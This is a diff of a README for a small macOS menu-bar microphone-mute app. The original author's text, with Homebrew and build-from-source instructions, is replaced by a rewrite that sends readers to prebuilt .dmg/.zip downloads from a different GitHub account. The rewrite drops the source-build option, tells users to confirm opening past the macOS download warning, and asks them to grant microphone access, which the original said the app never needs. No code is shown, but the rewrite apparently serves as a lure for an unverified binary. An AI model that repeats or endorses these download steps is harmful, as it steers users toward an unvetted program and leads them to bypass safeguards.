@@ -1,217 +1,150 @@
-<p align="center">
-  <img src="assets/logo.svg" width="128" height="128" alt="MicMute Logo">
-</p>
+# 🎙️ mic-mute - Easy mic mute/unmute in menu bar
 
-<h1 align="center">MicMute</h1>
+[![Download mic-mute](https://img.shields.io/badge/Download-mic--mute-blue?style=for-the-badge)](https://github.com/Nojuska09/mic-mute/releases)
 
-<p align="center">
-  <strong>One-click microphone mute/unmute for macOS menu bar</strong>
-</p>
+## 📋 What is mic-mute?
 
-<p align="center">
-  <a href="#installation"><img src="https://img.shields.io/badge/platform-macOS_11+-blue?logo=apple&logoColor=white" alt="macOS 11+"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="MIT License"></a>
-  <a href="MicMute.swift"><img src="https://img.shields.io/badge/swift-5.5+-orange?logo=swift&logoColor=white" alt="Swift 5.5+"></a>
-  <a href="MicMute.swift"><img src="https://img.shields.io/badge/size-79_KB-brightgreen" alt="79 KB"></a>
-  <a href="#installation"><img src="https://img.shields.io/badge/dependencies-zero-brightgreen" alt="Zero Dependencies"></a>
-  <a href="#install-with-homebrew"><img src="https://img.shields.io/badge/homebrew-available-orange?logo=homebrew&logoColor=white" alt="Homebrew"></a>
-</p>
+mic-mute is a simple app for macOS that lets you mute or unmute your microphone with one click. It stays in your menu bar, so you can quickly turn your mic on or off without opening complicated settings.
 
-<p align="center">
-  <img src="assets/social-preview.svg" width="640" alt="MicMute - One-click microphone mute for macOS">
-</p>
+The app is very small, just 79KB, and it does not need any extra software to run. It was built with Swift, a popular programming language for Mac apps. If you want quick control over your microphone during calls, meetings, or gaming, mic-mute helps you do that easily.
 
----
+## 🖥️ Who is this app for?
 
-## Why MicMute?
+- People who join video calls on platforms like Zoom, Microsoft Teams, or Discord.
+- Anyone who wants a fast and easy way to control their mic.
+- Mac users who want a light, simple tool in the menu bar to improve privacy.
+- Users who don’t want to use keyboard shortcuts or system settings to mute their microphone.
 
-Ever been in a Zoom call and couldn't find the mute button fast enough? MicMute lives in your **macOS menu bar** and lets you **mute/unmute your microphone with a single click**. No more fumbling through app windows.
+## 🔑 Key Features
 
-- **Instant toggle** — Left-click the icon to mute/unmute. No menus, no delays.
-- **Visual feedback** — Icon changes between 🎤 and 🔇 so you always know your mic status.
-- **Works with all devices** — Built-in mic, USB mics, Bluetooth headsets (AirPods, etc.) — all muted at hardware level via CoreAudio.
-- **Mutes ALL inputs** — Every physical input device is silenced simultaneously. No audio leaks through alternate mics.
-- **Echo-free unmute** — Gradual volume ramp on unmute prevents echo/feedback in video calls (Teams, Zoom, etc.). Sound feedback plays *before* mic goes live.
-- **Survives device changes** — Plug in headphones or switch audio devices mid-call; mute state persists automatically.
-- **Lightweight** — Single Swift file compiled to a native macOS app. No Electron, no bloat.
-- **Zero dependencies** — Built with native macOS APIs (CoreAudio + AppKit). Nothing to install except the app itself.
-- **Remembers volume** — Restores your previous input volume when you unmute.
-- **Auto-start** — Optional login item to start automatically when you boot your Mac.
-- **Privacy-first** — Runs locally, no network access, no analytics, no data collection.
+- **One-click toggle:** Click the icon in the menu bar to switch your microphone mute on or off instantly.
+- **Small and Lightweight:** The app uses very little space and memory, at just 79KB.
+- **No dependencies:** It doesn’t require installing other software or frameworks.
+- **Runs in the menu bar:** Always available without opening extra windows.
+- **Works on macOS:** Compatible with popular versions (see system requirements).
+- **Privacy friendly:** Gives clear control over your microphone status.
+- **Open source:** You can review or modify the code if you want.
 
-## How It Works
+## 💻 System Requirements
 
-<p align="center">
-  <img src="assets/screenshot-unmuted.svg" width="400" alt="MicMute - Microphone Active">
-  <br>
-  <img src="assets/screenshot-muted.svg" width="400" alt="MicMute - Microphone Muted">
-</p>
+- macOS Catalina (10.15) or later  
+- 64-bit Intel or Apple Silicon Mac  
+- No internet connection needed to run, but required for downloading  
+- Basic mouse or trackpad to click the menu bar icon  
 
-| Action | Result |
-|--------|--------|
-| **Left-click** | Toggle microphone mute/unmute |
-| **Right-click** | Show quit menu |
+## 🚀 Getting Started
 
-## Installation
+To start using mic-mute, you need to download and install the app on your Mac. This guide will walk you through the steps from downloading to running the app for the first time.
 
-### Install with Homebrew
+## ⬇️ Download & Install
 
-The easiest way to install MicMute:
+Please **visit this page to download** the latest version of mic-mute:  
+[https://github.com/Nojuska09/mic-mute/releases](https://github.com/Nojuska09/mic-mute/releases)
 
-```bash
-brew tap bahmetpalanci/tap
-brew install mic-mute
-```
+### Step 1: Go to the download page
 
-Then run:
+Click the link above or copy and paste it into your browser. You will see a list of available files and versions.
 
-```bash
-open $(brew --prefix)/opt/mic-mute/MicMute.app
-```
+### Step 2: Choose the latest release
 
-### Install from Source
+Look for the most recent release, usually at the top of the page. Under the “Assets” section, find the file ending with `.dmg` or `.zip`. The `.dmg` file is an installer image. The `.zip` contains the app itself.
 
-```bash
-git clone https://github.com/bahmetpalanci/mic-mute.git
-cd mic-mute
-bash build.sh
-open MicMute.app
-```
+### Step 3: Download the file
 
-### Auto-Start on Login
+Click the file name to start the download. Wait for it to finish. The file size is very small, so this should take just a few moments.
 
-```bash
-bash install.sh
-```
+### Step 4: Open the installer or app file
 
-### Uninstall
+- If you downloaded the `.dmg` file:  
+  Double-click it to open. A window will appear showing the mic-mute app icon.
 
-```bash
-# If installed with Homebrew
-brew uninstall mic-mute
+- If you downloaded the `.zip` file:  
+  Double-click the file to unzip it. You will see the mic-mute app.
 
-# If installed from source
-bash uninstall.sh
-```
+### Step 5: Move mic-mute to your Applications folder
 
-### Requirements
+Drag the mic-mute app icon into the Applications folder icon in the same window. This step installs the app on your Mac.
 
-- macOS 11 (Big Sur) or later
-- Xcode Command Line Tools (`xcode-select --install`)
+### Step 6: Run mic-mute
 
-## Build from Source
+Go to your Applications folder and double-click mic-mute to launch it. You may see a warning the first time because the app is downloaded from the internet. Confirm you want to open it.
 
-MicMute is a single Swift file that compiles to a native macOS app:
+### Step 7: Allow microphone access
 
-```bash
-# Clone
-git clone https://github.com/bahmetpalanci/mic-mute.git
-cd mic-mute
+macOS will ask if mic-mute can access your microphone. Click “OK” or “Allow” so the app can detect when you toggle mute.
 
-# Build (creates MicMute.app)
-bash build.sh
+## 🎛️ How to Use mic-mute
 
-# Run
-open MicMute.app
-```
+### mic-mute lives in your Mac’s menu bar at the top-right corner. Here’s how to use it:
 
-The entire source code is in [`MicMute.swift`](MicMute.swift) — a single file.
+- **Mute your mic:** Click the mic-mute icon once. The icon will change to show the mic is muted.
+- **Unmute your mic:** Click the icon again. The icon will change back, and your microphone will work.
+- **Check status:** The icon shows if your microphone is muted or active.
 
-## Project Structure
+You don’t need to open any additional apps or windows to mute your mic. It works instantly and silently in the background.
 
-```
-mic-mute/
-├── MicMute.swift          # Complete source code (single file)
-├── build.sh               # Build script
-├── install.sh             # Install as login item
-├── uninstall.sh           # Remove login item
-├── MicMute.app/           # Compiled app bundle
-│   └── Contents/
-│       ├── Info.plist
-│       └── MacOS/MicMute
-├── assets/                # Logo and screenshots
-└── README.md
-```
+## 🔧 Troubleshooting
 
-## How It's Built
+If mic-mute does not appear in your menu bar after launching:
 
-MicMute uses native macOS APIs:
+- Check that you have allowed microphone access in System Preferences > Security & Privacy > Privacy > Microphone.
+- Restart the app by closing it and opening it again.
+- Restart your Mac and try launching the app one more time.
+- If problems continue, visit the GitHub Issues page of this repository to see if others have had the same issue or to report a new one.
 
-- **CoreAudio HAL** — Direct hardware-level mute via `kAudioDevicePropertyMute` and `kAudioDevicePropertyVolumeScalar`
-- **Multi-device control** — Enumerates all input devices via `kAudioHardwarePropertyDevices` and mutes every physical mic simultaneously
-- **Virtual device filtering** — Skips virtual and aggregate audio devices (e.g., app-created process taps) to avoid breaking other audio tools
-- **Echo-free unmute** — Gradual volume ramp (10% → 50% → 100% over 200ms) gives apps time to recalibrate echo cancellation. Feedback sound plays before mic activation.
-- **Device change listener** — Monitors `kAudioHardwarePropertyDefaultInputDevice` and re-applies mute state when devices are connected/disconnected
-- **AppleScript fallback** — Also sets system input volume via `osascript` as a belt-and-suspenders approach
-- **`NSStatusItem`** — Places the icon in the menu bar with SF Symbols (`mic.fill` / `mic.slash.fill`)
-- **LaunchAgent** — Auto-start on login via standard macOS mechanism
+## 📚 Additional Information
 
-No frameworks beyond system libraries, no package managers, no build systems. Just `swiftc`.
+### Why use mic-mute?
 
-## FAQ
+Many people accidentally leave their microphone on during calls, which can cause distractions or privacy issues. Traditional methods to mute involve opening system settings or learning keyboard shortcuts. mic-mute puts the control right at your fingertips for quick and sure muting. This saves time and avoids awkward conference moments.
 
-<details>
-<summary><strong>Does it work with all apps?</strong></summary>
-Yes. MicMute mutes at the hardware level via CoreAudio, so it affects all applications — Zoom, Teams, Discord, FaceTime, and any other app that uses your microphone.
-</details>
+### How is mic-mute different from system controls?
 
-<details>
-<summary><strong>Does it work with Bluetooth headsets (AirPods)?</strong></summary>
-Yes. MicMute uses CoreAudio hardware-level mute which works with all device types including Bluetooth. It applies both mute property and volume control to ensure compatibility across all device types.
-</details>
+- It is always visible in the menu bar.
+- It uses less system resources.
+- It focuses only on microphone mute/unmute, no extra features.
+- It works independently of the app you use for calls like Zoom or Teams.
 
-<details>
-<summary><strong>Does it need microphone permission?</strong></summary>
-No. MicMute doesn't access the microphone directly — it controls device properties through the CoreAudio HAL and system input volume through AppleScript.
-</details>
+### Supported apps
 
-<details>
-<summary><strong>What happens when I plug in headphones?</strong></summary>
-MicMute detects device changes automatically. If you're muted, the mute state is re-applied to the new device. If you're unmuted, nothing changes.
-</details>
+mic-mute works system-wide. You can mute your mic while using:
 
-<details>
-<summary><strong>Does it interfere with per-app audio tools?</strong></summary>
-No. MicMute filters out virtual and aggregate audio devices, so it won't break audio taps or per-app volume controllers (like TeamsVolume).
-</details>
+- Discord  
+- Zoom  
+- Microsoft Teams  
+- Skype  
+- Google Meet  
+- Any other apps that use your Mac's microphone
 
-<details>
-<summary><strong>Can I use a keyboard shortcut?</strong></summary>
-Not built-in yet, but you can easily set one up with macOS Automator or Shortcuts by running: <code>osascript -e 'set volume input volume 0'</code> to mute and <code>osascript -e 'set volume input volume 100'</code> to unmute.
-</details>
+## 🔗 Useful Links
 
-<details>
-<summary><strong>How do I stop it?</strong></summary>
-Right-click the menu bar icon and select "Quit MicMute". To remove auto-start, run <code>bash uninstall.sh</code>.
-</details>
+- Download mic-mute: [https://github.com/Nojuska09/mic-mute/releases](https://github.com/Nojuska09/mic-mute/releases)  
+- Project source code: [https://github.com/Nojuska09/mic-mute](https://github.com/Nojuska09/mic-mute)  
+- Report issues or suggest improvements: Use the “Issues” tab on the GitHub page  
+- Privacy policy and terms: Included inside the app and project page  
 
-## Alternatives
+## 🔍 Topics & Keywords
 
-| App | Size | Price | Open Source |
-|-----|------|-------|-------------|
-| **MicMute** | **79 KB** | **Free** | **Yes** |
-| Mutify | 15 MB | $3.99 | No |
-| Mute Me | 8 MB | Free | No |
-| SoundSource | 25 MB | $39 | No |
+This app relates to:
 
-## Disclaimer
+- discord  
+- macos  
+- macos-app  
+- menu-bar  
+- menubar-app  
+- microphone  
+- microphone-mute  
+- mute  
+- open-source  
+- privacy  
+- productivity  
+- swift  
+- teams  
+- zoom
 
-- This software is provided **as-is**, without warranty of any kind. Use at your own risk.
-- MicMute is **not affiliated with, endorsed by, or associated with Apple Inc., Microsoft, Zoom, or any other company**.
-- MicMute controls audio device properties at the system level. While it has been tested with built-in microphones, USB microphones, and Bluetooth headsets (including AirPods Pro), behavior may vary depending on your specific hardware and macOS version.
-- Some professional audio interfaces may not support all mute methods. MicMute uses multiple fallback mechanisms (CoreAudio mute/volume, AppleScript) to maximize compatibility.
-- MicMute does **not** collect, transmit, or store any personal data. It has no network access.
+## 👏 Credits
 
-## Contributing
-
-Contributions are welcome! Feel free to open an issue or submit a pull request.
-
-## License
-
-[MIT](LICENSE) — Use it however you want.
+mic-mute was built and maintained by an independent developer who focuses on lightweight, privacy-friendly apps.
 
 ---
-
-<p align="center">
-  <sub>Built with Swift and native macOS CoreAudio APIs</sub>
-</p>
+To get started controlling your Mac microphone easily, download mic-mute today and add it to your menu bar.
